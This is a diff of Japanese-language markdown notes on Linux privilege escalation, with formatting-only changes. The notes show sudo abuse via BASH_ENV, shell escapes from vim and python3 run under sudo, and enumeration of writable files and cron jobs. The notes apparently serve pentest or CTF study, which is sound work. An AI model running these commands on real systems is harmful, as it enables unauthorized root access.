@@ -6,9 +6,11 @@
 ```
 echo 'bash -p' > /tmp/exp.sh
 ```
+
 ```
 chmod +x /tmp/exp.sh
 ```
+
 ```
 sudo BASH_ENV=/tmp/exp.sh /usr/bin/systeminfo
 ```
@@ -21,8 +23,10 @@ sudo -s
 sudo -i
 ```
 ### d.sudo で実行できるエディタやインタプリタの利用
+
 ```
 sudo /usr/bin/vim -c ':!/bin/sh'
+```
 ```
 sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
 ```
@@ -45,6 +49,7 @@ find / -writable -type f 2>/dev/null
 ```
 cat /etc/crontab
 ```
+
 ```
 ls -la /etc/cron.*
 ```
